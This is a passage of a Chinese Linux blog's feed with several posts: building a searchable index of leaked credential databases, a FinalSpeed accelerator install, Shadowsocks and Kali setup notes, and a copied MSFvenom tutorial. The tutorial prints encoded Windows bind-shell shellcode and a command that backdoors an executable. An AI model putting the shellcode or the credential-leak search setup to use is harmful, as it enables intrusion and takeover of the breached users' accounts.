&lt;pre&gt;`show table status;//查看数据库状态
desc table; //查看表结构
set names &apos;utf8&apos;;//设置编码，数据表统一编码UTF-8
drop index index_name on table_name; //删除索引
alter table table_name add primary key(id);//添加主键
alter table table_name drop PRIMARY KEY;//去掉主键
truncate table table_name;//清空表中数据
alter table 表名 rename to 新表名;//重命名表
alter table table_name change Name Name varchar(16);//重命名列及格式
alter table table_name add column xxxx varchar(64) after aaaa;//添加列
alter table 表名 drop column 列名;//删除列
set @t=0;
update table_name set id=(@t:=@t+1);//重建ID`&lt;/pre&gt;

##### 导入数据

&lt;pre&gt;`load data infile &apos;/tmp/xxxx.sql&apos; 
into table `evil_xxxx` 
fields terminated by &apos;&apos;
lines terminated by &apos;\n&apos;;`&lt;/pre&gt;
速度相对较快

##### 关于索引

中文全文索引主要依赖mysqlctf和sphinx，测试发现，sphinx对于分词索引速度较快，但分词的原因导致诸如搜索humor却搜索不到humorous的情况，而mysqlctf索引速度相对较慢且无进度信息，但索引大小可控，一般全文索引1G数据库信息对应MYI大小为5-9G

关于Coreseek的编译使用，官方有较多文档

Sphinx配置文件（全文检索包括分词及最小分词5字母）
&lt;pre&gt;`source evil_xxx
{
  type              = mysql
  sql_host          = localhost
  sql_user          = ooo
  sql_pass          = xxx
  sql_db            = db
  sql_port          = 3306
  sql_query_pre     = SET NAMES utf8
  sql_query         = SELECT id,username,password,passhash,email FROM xxxx
  sql_query_info    = SELECT * FROM xxxx WHERE id=$id
}

index evil_xxx
{
  source            = evil_xxx
  path              = /usr/local/coreseek/var/data/evil_xxx
  docinfo           = extern
  mlock             = 0
  morphology        = none
  min_word_len      = 1
  html_strip        = 0
  charset_dictpath  = /usr/local/mmseg3/etc/
  charset_type      = zh_cn.utf-8
  ngram_len         = 0
  min_infix_len     = 5
  enable_star       = 1//允许模糊搜索
}`&lt;/pre&gt;
检索时调用官方API即可

关于MYSQLCFT建立索引的方法

首先是安装插件
&lt;pre&gt;`wget http://mysqlcft.googlecode.com/files/mysqlcft-1.0.0-x86_64-bin.tar.gz
tar zxvf mysqlcft-1.0.0-x86_64-bin.tar.gz
mkdir -p /usr/local/mysqlcft/lib/mysql/plugin/
cp mysqlcft.so /usr/local/mysqlcft/lib/mysql/plugin/`&lt;/pre&gt;
登陆mysql后
&lt;pre&gt;`INSTALL PLUGIN mysqlcft SONAME &apos;mysqlcft.so&apos;;
SHOW PLUGINS;`&lt;/pre&gt;
安装OK后建立索引
&lt;pre&gt;`ALTER IGNORE TABLE 数据库名.表名 ADD FULLTEXT INDEX 全文联合索引名 (字段名1,字段名2) WITH PARSER mysqlcft;`&lt;/pre&gt;
如
&lt;pre&gt;`ALTER IGNORE TABLE db.evil_xxxx ADD FULLTEXT INDEX fullindex(username，password,passhash,email) WITH PARSER mysqlcft;`&lt;/pre&gt;
在搜索时
&lt;pre&gt;`SELECT * FROM evil_xxxx WHERE MATCH(username,password,passhash,email) AGAINST (&apos;searchinfo&apos; IN BOOLEAN MODE);`&lt;/pre&gt;
重建索引
&lt;pre&gt;`REPAIR TABLE 数据库名.表名 QUICK;
</code></pre><h5 id="几个Tips"><a href="#几个Tips" class="headerlink" title="几个Tips"></a>几个Tips</h5><ul>
<li>增加来源数据库/网站字段，方便针对查询</li>
<li>同库分隔符格式不同，正则替换</li>
<li>数据库引擎选择myisam（而不是INNODB），可使用alter转换</li>
<li>入库分隔符为避免与密码字符重合，可使用类似==aaaa==等分隔符替换入库</li>
<li>数据库中有的邮箱在前密码在后，有的密码在前，邮箱在后，使用awk多写几行分支语句</li>
<li>配置my.cnf文件使得mysql数据处理效率最大化<br>From Le4F’Blog</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://le4f.net/post/post/build-social-engineer-evildata-search-engine&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://le4f.net/post/post
    
    </summary>
    
      <category term="记录" scheme="http://www.linux52.com/categories/%E8%AE%B0%E5%BD%95/"/>
    
    
  </entry>
  
  <entry>
    <title>搬瓦工VPS/OPENVZ加速利器FINALSPEED</title>
    <link href="http://www.linux52.com/2016-03-18-e6-90-ac-e7-93-a6-e5-b7-a5vpsopenvz-e5-8a-a0-e9-80-9f-e5-88-a9-e5-99-a8finalspeed.html"/>
    <id>http://www.linux52.com/2016-03-18-e6-90-ac-e7-93-a6-e5-b7-a5vpsopenvz-e5-8a-a0-e9-80-9f-e5-88-a9-e5-99-a8finalspeed.html</id>
    <published>2016-03-18T12:01:22.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>FinalSpeed是高速双边加速软件,可加速所有基于tcp协议的网络服务,在高丢包和高延迟环境下,仍可达到90%的物理带宽利用率,即使高峰时段也能轻松跑满带宽.它的前身是xsocks，今天在一台openvz架构vps上测试了一下效果非常明显，简直是咸鱼翻身。所谓双边加速就是服务端和客户端都要安装，PS：这个不是用来扶墙的，而是可以给ss等扶墙工具加速的。所以如果你经济有限，只能买一台<a href="http://www.cmsky.com/bandwagonhost-promo/" target="_blank" rel="external">搬瓦工</a>vps，但是又苦于晚高峰时的表现，那么FinalSpeed是最适合你的方案了。</p>
<p>项目Github地址：<a href="https://github.com/d1sm/finalspeed" target="_blank" rel="external">https://github.com/d1sm/finalspeed</a></p>
<p>论坛： <a href="http://www.d1sm.net/forum-44-1.html" target="_blank" rel="external">http://www.d1sm.net/forum-44-1.html</a></p>
<h4 id="一、服务端安装"><a href="#一、服务端安装" class="headerlink" title="一、服务端安装"></a>一、服务端安装</h4><p>注意问题:<br>服务端会启动iptables,如果服务器修改过ssh端口,请先开放ssh端口,否则可能导致ssh连接失败.<br>开放端口命令<br>service iptables start<br>iptables -A INPUT -p tcp –dport 端口号 -j ACCEPT<br>iptables -A OUTPUT -p tcp –sport 端口号 -j ACCEPT<br>service iptables save</p>
<p>一键安装，一键脚本非常方便，我在debian7上安装很顺利<br>rm -f install_fs.sh<br>wget  <a href="http://fs.d1sm.net/finalspeed/install_fs.sh" target="_blank" rel="external">http://fs.d1sm.net/finalspeed/install_fs.sh</a><br>chmod +x install_fs.sh<br>./install_fs.sh 2&gt;&amp;1 | tee install.log</p>
<p><a href="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed1.png" target="_blank" rel="external"><img src="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed1.png" alt="FinalSpeed"></a></p>
<p>如图所示就是安装成功的，FinalSpeed is running.正在运行。运行正常可以直接看<strong>第二步</strong>。</p>
<p>debian,ubuntu下如果执行脚本出错,请切换到dash,<br>切换方法: sudo dpkg-reconfigure dash 选no</p>
<p>更新<br>执行一键安装会自动完成更新.</p>
<p>卸载<br>sh /fs/stop.sh ; rm -rf /fs</p>
<p>启动<br>sh /fs/start.sh</p>
<p>停止<br>sh /fs/stop.sh</p>
<p>重新启动<br>sh /fs/restart.sh</p>
<p>日志<br>tail -f /fs/server.log</p>
<p>设置服务端口<br>默认udp 150和tcp 150 ,由于finalspeed的工作原理,请不要在本机防火墙开放finalspeed所使用的tcp端口.<br>mkdir -p /fs/cnf/ ; echo 端口号 &gt; /fs/cnf/listen_port ; sh /fs/restart.sh</p>
<p>设置开机启动<br>chmod +x /etc/rc.local<br>vi /etc/rc.local<br>加入<br>sh /fs/start.sh</p>
<p>每天晚上3点自动重启<br>crontab -e<br>加入<br>0 3 <em> </em> *  sh /fs/restart.sh</p>
<h4 id="二、客户端设置"><a href="#二、客户端设置" class="headerlink" title="二、客户端设置"></a>二、客户端设置</h4><p><span class="download"><a href="http://fs.d1sm.net/finalspeed/finalspeed_install1.0.exe" title="FinalSpeed" target="_blank" rel="external">Windows客户端下载</a></span></p>
<p>1.服务器必须同时部署FinalSpeed服务端才能进行加速.<br>2.客户端必须准确设置物理带宽,最终加速的速度不会超过所设置的带宽值,如果设置值高于实际物理带宽会造成丢包和不必要的重传.<br>3.客户端首选udp协议,如果udp不稳定,请切换到tcp.<br>4.若服务器为openvz架构（比如搬瓦工）,客户端只能选择udp协议,其他架构同时支持tcp和udp协议.<br>5.windows客户端使用tcp协议时不兼容锐速,停止锐速后可以正常运行.</p>
<p><strong>加速ss教程（前提是你本地ss已经测试过没问题）</strong><br>假设服务器IP为10.10.10.10,finalspeed端口为默认150,ss端口为8989.<br>加速前提ss服务端运行正常,ss客户端也能正常登录.<br>1.运行FinalSpeed客户端,填写服务器地址 10.10.10.10 .设置带宽，根据你实际带宽设置，比如我这里是10M上下行对等光纤。</p>
<p><a href="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed2.png" target="_blank" rel="external"><img src="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed2.png" alt="FinalSpeed"></a></p>
<p>2.点击添加,增加加速端口,加速端口为ss端口8989,如果为其他端口,请相应修改,本地端口任意,这里是2000 .传输协议UDP</p>
<p><a href="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed3.png" target="_blank" rel="external"><img src="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed3.png" alt="FinalSpeed"></a></p>
<p>3.打开ss客户端,添加服务器,服务器IP为127.0.0.1,服务器端口为加速端口对应的本地端口,这里是2000,然后设置你的ss密码,加密方式.</p>
<p><a href="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed4.jpg" target="_blank" rel="external"><img src="http://img.cmsky.com/wp-content/uploads/2015/12/finalspeed4.jpg" alt="FinalSpeed"></a></p>
<p>4.确定保存,选择使用刚添加的服务器,并设置浏览器代理,成功连接后,FinalSpeed状态栏会出现”连接服务器成功”提示.更多教程访问<a href="http://www.d1sm.net/thread-7-1-1.html" target="_blank" rel="external">作者论坛</a>。</p>
<p>总结：本人实测如果你服务端是manyuser也可以加速，但是你得让每个端口的用户都装上FinalSpeed，太麻烦。所以这个东东最适合的就是经济有限，只能买个<a href="http://www.cmsky.com/bandwagonhost-promo/" target="_blank" rel="external">搬瓦工</a>等openvz架构的vps自用的同学。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;FinalSpeed是高速双边加速软件,可加速所有基于tcp协议的网络服务,在高丢包和高延迟环境下,仍可达到90%的物理带宽利用率,即使高峰时段也能轻松跑满带宽.它的前身是xsocks，今天在一台openvz架构vps上测试了一下效果非常明显，简直是咸鱼翻身。所谓双边加速就
    
    </summary>
    
      <category term="记录" scheme="http://www.linux52.com/categories/%E8%AE%B0%E5%BD%95/"/>
    
    
  </entry>
  
  <entry>
    <title>shadowscoke客户 gui版</title>
    <link href="http://www.linux52.com/2015-12-24-shadowscoke-e5-ae-a2-e6-88-b7-gui-e7-89-88.html"/>
    <id>http://www.linux52.com/2015-12-24-shadowscoke-e5-ae-a2-e6-88-b7-gui-e7-89-88.html</id>
    <published>2015-12-23T18:06:41.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/shadowsocks/shadowsocks-gui" target="_blank" rel="external">https://github.com/shadowsocks/shadowsocks-gui</a></p>
<p><a href="https://github.com/shadowsocks/shadowsocks-qt5/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97" target="_blank" rel="external">https://github.com/shadowsocks/shadowsocks-qt5/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97</a></p>
<h1 id="Shadowsocks-Qt5"><a href="#Shadowsocks-Qt5" class="headerlink" title="Shadowsocks-Qt5"></a>Shadowsocks-Qt5</h1><p>Please check <a href="https://github.com/librehat/shadowsocks-qt5/wiki" target="_blank" rel="external">project’s wiki</a> for “how-tos”.</p>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a><a href="https://github.com/shadowsocks/shadowsocks-qt5#introduction" target="_blank" rel="external"></a>Introduction</h2><p>Shadowsocks-Qt5 is a native and cross-platform <a href="http://shadowsocks.org/" target="_blank" rel="external">shadowsocks</a> GUI client with advanced features.</p>
<h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a><a href="https://github.com/shadowsocks/shadowsocks-qt5#features" target="_blank" rel="external"></a>Features</h2><ul>
<li>Shadowsocks-Qt5 is written in C++ with Qt 5.</li>
<li>Support traffic statistics</li>
<li>Support server latency (lag) test</li>
<li>Use multiple profiles simultaneously</li>
<li><code>config.ini</code> is located under <code>~/.config/shadowsocks-qt5/</code> on *nix platforms, or under the application’s directory on Windows.</li>
</ul>
<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a><a href="https://github.com/shadowsocks/shadowsocks-qt5#note" target="_blank" rel="external"></a>Note</h2><p>If <code>ss-qt5</code> crashes and the <strong>only one instance</strong> mode is checked, you may need to manually delete<code>/tmp/qipc_sharedmemory_ShadowsocksQt*</code> and <code>/tmp/qipc_systemsem_ShadowsocksQt*</code>. Otherwise, <code>ss-qt5</code> will complain that another instance is already running.</p>
<h2 id="LICENSE"><a href="#LICENSE" class="headerlink" title="LICENSE"></a><a href="https://github.com/shadowsocks/shadowsocks-qt5#license" target="_blank" rel="external"></a>LICENSE</h2><p>&nbsp;</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://github.com/shadowsocks/shadowsocks-gui&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/shadowsocks/shadowsocks-gui&lt;/a
    
    </summary>
    
      <category term="linux mint" scheme="http://www.linux52.com/categories/linux-mint/"/>
    
    
  </entry>
  
  <entry>
    <title>MSFvenom</title>
    <link href="http://www.linux52.com/2015-12-22-msfvenom.html"/>
    <id>http://www.linux52.com/2015-12-22-msfvenom.html</id>
    <published>2015-12-22T09:42:02.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://7xn6ev.com1.z0.glb.clouddn.com//wp-content/uploads/2015/12/201512220940305.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2015/12/201512220940305-300x203.png" alt="msfvenom-msfencode"></a></p>
<h2 id="Using-the-MSFvenom-Command-Line-Interface"><a href="#Using-the-MSFvenom-Command-Line-Interface" class="headerlink" title="Using the MSFvenom Command Line Interface"></a>Using the MSFvenom Command Line Interface</h2><p><strong>msfvenom</strong> is a combination of <em>Msfpayload and Msfencode</em>, putting both of these tools into a single Framework instance. Note: <a href="https://community.rapid7.com/community/metasploit/blog/2014/12/08/good-bye-msfpayload-and-msfencode" title="Metasploit Unleashed | Exploit Development : MSFVenom" target="_blank" rel="external"><em><strong>msfvenom</strong></em> has replaced both msfpayload and msfencode as of June 8th, 2015.</a></p>
<p>The advantages of msfvenom are:</p>
<ul>
<li>One single tool</li>
<li>Standardized command line options</li>
<li>Increased speed<br>Msfvenom has a wide range of options available:<br><pre id="pre-msfu">root@kali:~# msfvenom -h<br>MsfVenom - a Metasploit standalone payload generator.<br>Also a replacement for msfpayload and msfencode.<br>Usage: /opt/metasploit/apps/pro/msf3/msfvenom [options] &lt;var=val&gt;<br>Options:<br>-p, –payload &lt;payload&gt; Payload to use. Specify a ‘-‘ or stdin to use custom payloads<br> –payload-options List the payload’s standard options<br>-l, –list [type] List a module type. Options are: payloads, encoders, nops, all<br>-n, –nopsled &lt;length&gt; Prepend a nopsled of [length] size on to the payload<br>-f, –format &lt;format&gt; Output format (use –help-formats for a list)<br> –help-formats List available formats<br>-e, –encoder &lt;encoder&gt; The encoder to use<br>-a, –arch &lt;arch&gt; The architecture to use<br> –platform &lt;platform&gt; The platform of the payload<br>-s, –space &lt;length&gt; The maximum size of the resulting payload<br> –encoder-space &lt;length&gt; The maximum size of the encoded payload (defaults to the -s value)<br>-b, –bad-chars &lt;list&gt; The list of characters to avoid example: ‘x00xff’<br>-i, –iterations &lt;count&gt; The number of times to encode the payload<br>-c, –add-code &lt;path&gt; Specify an additional win32 shellcode file to include<br>-x, –template &lt;path&gt; Specify a custom executable file to use as a template<br>-k, –keep Preserve the template behavior and inject the payload as a new thread<br>-o, –out &lt;path&gt; Save the payload<br>-v, –var-name &lt;name&gt; Specify a custom variable name to use for certain output formats<br> –smallest Generate the smallest possible payload<br>-h, –help Show this message</pre></li>
</ul>
<p></p>
<h3 id="MSFvenom-command-line-usage"><a href="#MSFvenom-command-line-usage" class="headerlink" title="MSFvenom command line usage"></a>MSFvenom command line usage</h3><p>We can see an example of the msfvenom command line below and its output:</p>
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -i 3 -f python
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai succeeded with size 353 (iteration=1)
x86/shikata_ga_nai succeeded with size 380 (iteration=2)
x86/shikata_ga_nai chosen with final size 380
Payload size: 380 bytes
buf = ""
buf += "xbbx78xd0x11xe9xdaxd8xd9x74x24xf4x58x31"
buf += "xc9xb1x59x31x58x13x83xc0x04x03x58x77x32"
buf += "xe4x53x15x11xeaxffxc0x91x2cx8bxd6xe9x94"
buf += "x47xdfxa3x79x2bx1cxc7x4cx78xb2xcbxfdx6e"
buf += "xc2x9dx53x59xa6x37xc3x57x11xc8x77x77x9e"
buf += "x6dxfcx58xbax82xf9xc0x9ax35x72x7dx01x9b"
buf += "xe7x31x16x82xf6xe2x89x89x75x67xf7xaaxae"
buf += "x73x88x3fxf5x6dx3dx9exabx06xdaxffx42x7a"
buf += "x63x6bx72x59xf6x58xa5xfex3fx0bx41xa0xf2"
buf += "xfex2dxc9x32x3dxd4x51xf7xa7x56xf8x69x08"
buf += "x4dx27x8ax2ex19x99x7cxfcx63xfax5cxd5xa8"
buf += "x1fxa8x9bx88xbbxa5x3cx8fx7fx38x45xd1x71"
buf += "x34x59x84xb0x97xa0x99xccxfex7fx37xe2x28"
buf += "xeax57x01xcfxf8x1ex1exd8xd3x05x67x73xf9"
buf += "x32xbbx76x8cx7cx2fxf6x29x0fxa5x36x2ex73"
buf += "xdex31xc3xfexaex49x64xd2x39xf1xf2xc7xa0"
buf += "x06xd3xf6x1axfex0axfex28xbex1ax42x9cxde"
buf += "x01x16x27xbdx29x1cxf8x7dx47x2cx68x06x0e"
buf += "x23x31xfex7dx58xe8x7bx76x4bxfexdbx17x51"
buf += "xfaxdfxffxa1xbcxc5x66x4bxeax23x86x47xb4"
buf += "xe7xd5x71x77x2ex24x4ax3dxb1x6fx12xf2xb2"
buf += "xd0x55xc9x23x2exc2xa5x73xb2xc8xb7x7dx6b"
buf += "x55x29xbcx26xddxf6xe3xf6x25xc6x5cxadx9c"
buf += "x9dx18x08x3bxbfxd2xffx92x18x5fx48x9bxe0"
buf += "x7bx03xa5x32x11x27x2bx25xcdx44xdbxbdxb9"
buf += "xcdx48xdax56x4cx56xd5x04x87x48x3ax6bx9c"
buf += "x2ax15x4dxbcx0bx56x06xb5xc9x46xd0xfax68"
buf += "xa6x76xe9x52x2cx24x62x28xe1x1dx87xb0x66"
buf += "x93x85x8fx87x0fxcfx16x29x76x03x55x0cx0e"
buf += "x3fx17xac"</pre>
The msfvenom command and resulting shellcode above generates a _Windows bind shell_ with three iterations of the_shikata_ga_nai encoder_ without any null bytes and in the python format.

### MSFvenom Platforms

Here is a list of available platforms one can enter when using the –platform switch.
<pre id="pre-msfu">Cisco or cisco
OSX or osx
Solaris or solaris
BSD or bsd
OpenBSD or openbsd
Firefox or firefox
BSDi or bsdi
NetBSD or netbsd
NodeJS or nodejs
FreeBSD or freebsd
Python or python
AIX or aix
JavaScript or javascript
HPUX or hpux
PHP or php
Irix or irix
Unix or unix
Linux or linux
Ruby or ruby
Java or java
Android or android
Netware or netware
Windows or windows
</pre>

<h3 id="MSFvenom-options-and-uses"><a href="#MSFvenom-options-and-uses" class="headerlink" title="MSFvenom options and uses"></a>MSFvenom options and uses</h3><p><strong>msfvenom -v or –var-name</strong></p>
<p>Usage: -v, –var-name &lt;name&gt;</p>
<p>Specify a custom variable name to use for certain output formats. Assigning a name will change the output’s variable from the default “buf” to whatever word you supplied.</p>
<p>Default output example:</p>
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai chosen with final size 326
Payload size: 326 bytes
buf = ""
buf += "xdaxdcxd9x74x24xf4x5bxbaxc5x5exc1x6ax29"
&lt;snip&gt;</pre>
Using –var-name output example:
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -f python -v notBuf
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai chosen with final size 326
Payload size: 326 bytes
notBuf = ""
notBuf += "xdaxd1xd9x74x24xf4xbfxf0x1fxb8x27x5a"
&lt;snip&gt;
</pre>
**msfvenom –help-format**
Issuing the msfvenom command with this switch will output all available payload formats.
<pre id="pre-msfu">root@kali:~# msfvenom --help-formats 
Executable formats
asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small,
hta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection,
psh-cmd, vba, vba-exe, vba-psh, vbs, war
Transform formats 
bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, 
powershell, ps1, py, python, raw, rb, ruby, sh,
vbapplication, vbscript</pre>
**msfvenom -n, –nopsled**
Sometimes you need to add a few NOPs at the start of your payload. This will place a nopsled of [length] size at the beginning of your payload.

BEFORE:
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none succeeded with size 299 (iteration=0)
generic/none chosen with final size 299
Payload size: 299 bytes
buf = ""
buf += "xfcxe8x82x00x00x00x60x89xe5x31xc0x64x8b" **First line of payload
buf += "x50x30x8bx52x0cx8bx52x14x8bx72x28x0fxb7"
&lt;snip&gt;</pre>
AFTER:
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e generic/none -f python -n 26
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none succeeded with size 299 (iteration=0)
generic/none chosen with final size 299
Successfully added NOP sled from x86/single_byte
Payload size: 325 bytes
buf = ""
buf += "x98xfdx40xf9x43x49x40x4ax98x49xfdx37x43" **NOPs
buf += "x42xf5x92x42x42x98xf8xd6x93xf5x92x3fx98"
buf += "xfcxe8x82x00x00x00x60x89xe5x31xc0x64x8b" **First line of payload
&lt;snip&gt;</pre>
**msfvenom –smallest**
If the “smallest” switch is used, msfvevom will attempt to create the smallest shellcode possible using the
selected encoder and payload.
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai chosen with final size 326
Payload size: 326 bytes
&lt;snip&gt;

root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b 'x00' -f python --smallest
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 312 (iteration=0)
x86/shikata_ga_nai chosen with final size 312
Payload size: 312 bytes
&lt;snip&gt;</pre>
**msfvenom -c, –add-code**
Specify an additional win32 shellcode file to include, essentially creating a two (2) or more payloads in one (1) shellcode.

Payload #1:
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw &gt; messageBox
No encoder or badchars specified, outputting raw payload
Payload size: 267 bytes
</pre>
Adding payload #2:
<pre id="pre-msfu">root@kali:~# msfvenom -c messageBox -a x86 --platform windows -p windows/messagebox TEXT="We are evil" -f raw &gt; messageBox2
Adding shellcode from messageBox to the payload
No encoder or badchars specified, outputting raw payload
Payload size: 850 bytes</pre>
Adding payload #3:
<pre id="pre-msfu">root@kali:~# msfvenom -c messageBox2 -a x86 --platform Windows -p windows/shell/bind_tcp -f exe -o cookies.exe
Adding shellcode from messageBox2 to the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1469 bytes
Saved as: cookies.exe</pre>
Running the “cookies.exe” file will execute both message box payloads, as well as the bindshell using default settings (port 4444).

[![msfvenom_c_2](https://www.offensive-security.com/wp-content/uploads/2015/05/msfvenom_c_2-300x188.png)](https://www.offensive-security.com/wp-content/uploads/2015/05/msfvenom_c_2.png)

&nbsp;

**msfvenom -x, –template &amp; -k, –keep**
The -x, or –template, option is used to specify an existing executable to use as a template when creating your executable payload.
Using the -k, or –keep, option in conjunction will preserve the template’s normal behaviour and have your injected payload run as a separate thread.
<pre id="pre-msfu">root@kali:~# msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "x00" -f exe -o sol_bdoor.exe
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 299 (iteration=0)
x86/shikata_ga_nai chosen with final size 299
Payload size: 299 bytes
Saved as: sol_bdoor.exe</pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://7xn6ev.com1.z0.glb.clouddn.com//wp-content/uploads/2015/12/201512220940305.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;img src=&quot;
    
    </summary>
    
      <category term="记录" scheme="http://www.linux52.com/categories/%E8%AE%B0%E5%BD%95/"/>
    
    
  </entry>
  
  <entry>
    <title>kali 2.0 玩机姿势</title>
    <link href="http://www.linux52.com/2015-12-22-kali-2-0-e7-8e-a9-e6-9c-ba-e5-a7-bf-e5-8a-bf.html"/>
    <id>http://www.linux52.com/2015-12-22-kali-2-0-e7-8e-a9-e6-9c-ba-e5-a7-bf-e5-8a-bf.html</id>
    <published>2015-12-22T08:30:44.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>先来一个全面更新～<br>apt-get clean<br>apt-get update<br>apt-get upgrade<br>apt-get dist-upgrade<br>我觉得不要一味的去找阿里，中科大这些国内源，如果你觉得官方源的速度还可以，就不要换了，官方的是最可靠的。</p>
<p>卸载自带的iceweasl，安装firefox并汉化。<br>apt-get remove iceweasel<br>echo -e “\ndeb <a href="http://downloads.sourceforge.net/project/ubuntuzilla/mozilla/apt" target="_blank" rel="external">http://downloads.sourceforge.net/project/ubuntuzilla/mozilla/apt</a> all main” | tee -a /etc/apt/sources.list &gt; /dev/null</p>
<p><pre class="bbcode_code">apt-key adv –recv-keys –keyserver keyserver.ubuntu.com C1289A29</pre><br>apt-get update<br>apt-get install firefox-mozilla-build<br>这样就装好了，然后去这下载中文包<a href="http://ftp.mozilla.org/pub/firefox/releases/" target="_blank" rel="external">http://ftp.mozilla.org/pub/firefox/releases/</a><br>找到自己的版本，系统，在xpi文件夹有个zh_cn.xpi文件，下载就会提示安装了。</p>
<p>安装Flash插件：<br>apt-get install flashplugin-nonfree<br>update-flashplugin-nonfree –install<br>安装shadowsocks代理工具<br>apt-get install python-pip<br>pip install shadowsocks<br>相关配置：<a href="https://wiki.archlinux.org/index.php/Shadowsocks_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="external">shadowsocks详细配置</a></p>
<p>安装搜狗输入法～<br>apt-get install fcitx<br>到搜狗官网下载安装包：搜狗拼音for linux<br>cd /root/下载<br>dpkg -i 文件名.deb<br>reboot<br>配置神器vim～<br>贴出我的神级配置，研究了一天并借鉴了网上部分人的代码。<br>打开终端：<br>vim .vimrc //vim配置文件<br>//内容如下：<br>syntax on<br>set number<br>set nobackup<br>set cursorline<br>set autoindent<br>set cindent<br>set tabstop=4<br>set shiftwidth=4<br>set smartindent<br>set mouse=a<br>set showmatch<br>set incsearch<br>set nocompatible<br>set history=400<br>set makeprg=g++\ %\ -o\ /tmp/%&lt;<br>map ggvG”+y<br>map ggvG<br>map ggvG=</p>
<p>map :call CompileRunGpp()<br>func! CompileRunGpp()<br>exec “w”<br>exec “!clear”<br>exec “!g++ % -o /tmp/%&lt;.exe”<br>exec “! /tmp/%&lt;.exe”<br>endfunc</p>
<p>map :call Compile()<br>func! Compile()<br>exec “w”<br>exec “make”<br>exec “cw”<br>endfunc<br>实现了：<br>Ctrl+C 复制当前所有内容<br>Ctrl+A 全选<br>Ctr+Z 格式化所有代码（不是删除的意思。。）<br>F６ 编译，如有错误调用quickfix 可以快速查看错误的地方！<br>F7 编译并运行</p>
<p>不知不觉放出了大招！！</p>
<p>部分内容来源于互联网，大部分内容原创！转载请注明出处！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;先来一个全面更新～&lt;br&gt;apt-get clean&lt;br&gt;apt-get update&lt;br&gt;apt-get upgrade&lt;br&gt;apt-get dist-upgrade&lt;br&gt;我觉得不要一味的去找阿里，中科大这些国内源，如果你觉得官方源的速度还可以，就不要换了，官方的
    
    </summary>
    
      <category term="kali-linux" scheme="http://www.linux52.com/categories/kali-linux/"/>
    
    
  </entry>
  
  <entry>
    <title>kali-linux安装shadowsocks</title>
    <link href="http://www.linux52.com/2015-10-04-kali-linux-e5-ae-89-e8-a3-85shadowsocks.html"/>
    <id>http://www.linux52.com/2015-10-04-kali-linux-e5-ae-89-e8-a3-85shadowsocks.html</id>
    <published>2015-10-04T15:19:48.000Z</published>
